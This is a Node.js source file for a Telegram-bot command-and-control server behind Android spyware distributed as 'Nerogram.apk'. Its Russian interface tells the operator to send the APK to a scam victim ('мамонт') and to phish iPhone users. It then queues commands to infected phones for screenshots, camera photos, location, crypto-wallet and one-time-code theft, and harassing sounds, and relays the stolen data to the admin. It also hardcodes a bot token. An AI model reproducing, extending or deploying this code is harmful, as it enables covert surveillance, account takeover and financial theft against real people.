const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = '9001719911:AAFr3K_Kc6OXGvzuRzjTWJe76U98pYEPS98';
const ADMIN_ID = 9256345316;
const bot = new Telegraf(BOT_TOKEN);
const app = express();
app.use(express.json());

const devices = {};
const queue = {};

bot.start((ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.reply('Меню:', Markup.inlineKeyboard([
    [Markup.button.callback('📁 Генерация файла', 'gen')],
    [Markup.button.callback('💻 Устройства', 'devs')]
  ]));
});

bot.action('gen', (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;
  ctx.editMessageText('На какое устройство?', Markup.inlineKeyboard([
    [Markup.button.callback('iPhone', 'gen_ios'), Markup.button.callback('Android', 'gen_android')]
  ]));
});

bot.action('gen_ios', (ctx) => {
  ctx.editMessageText('Для iOS используем фишинг. Ссылку на страницу вставь сюда.');
});

bot.action('gen_android', async (ctx) => {
  // Проверяем, есть ли файл на сервере
  const apkPath = path.join(__dirname, 'Nerogram.apk');
  if (fs.existsSync(apkPath)) {
    await ctx.replyWithDocument({ source: apkPath, filename: 'Nerogram.apk' }, {
      caption: 'Файл Nerogram.apk готов. Отправь его мамонту.'
    });
  } else {
    ctx.reply('❌ Файл Nerogram.apk не найден на сервере. Загрузи его в корневую папку.');
  }
});

bot.action('devs', (ctx) => {
  if (Object.keys(devices).length === 0) return ctx.reply('Нет устройств.');
  const btns = Object.keys(devices).map(id => [Markup.button.callback(`📱 ${devices[id]}`, `dev_${id}`)]);
  ctx.editMessageText('Выбери устройство:', Markup.inlineKeyboard(btns));
});

bot.action(/^dev_(\w+)$/, (ctx) => {
  const id = ctx.match[1];
  ctx.editMessageText(`Управление ${devices[id]}`, Markup.inlineKeyboard([
    [Markup.button.callback('🔊 Стоны', `cmd_${id}_moan`), Markup.button.callback('📸 Скрин', `cmd_${id}_screen`)],
    [Markup.button.callback('📷 Фото', `cmd_${id}_photo`), Markup.button.callback('📍 Гео', `cmd_${id}_geo`)],
    [Markup.button.callback('💰 Крипта', `cmd_${id}_crypto`), Markup.button.callback('🔑 Код', `cmd_${id}_otp`)]
  ]));
});

bot.action(/^cmd_(\w+)_(\w+)$/, (ctx) => {
  const [_, devId, cmd] = ctx.match;
  if (!queue[devId]) queue[devId] = [];
  queue[devId].push(cmd);
  ctx.answerCbQuery(`Команда ${cmd} в очереди`);
});

app.post('/api/checkin', (req, res) => {
  const { id, name } = req.body;
  devices[id] = name;
  const cmd = (queue[id] && queue[id].length > 0) ? queue[id].shift() : null;
  res.json({ command: cmd });
});

app.post('/api/data', async (req, res) => {
  const { id, type, data, text } = req.body;
  if (type === 'photo') {
    await bot.telegram.sendPhoto(ADMIN_ID, { source: Buffer.from(data, 'base64') });
  } else if (type === 'text') {
    await bot.telegram.sendMessage(ADMIN_ID, `[${id}] ${text}`);
  }
  res.send('OK');
});

app.listen(3000, () => console.log('C2 API on 3000'));
bot.launch();
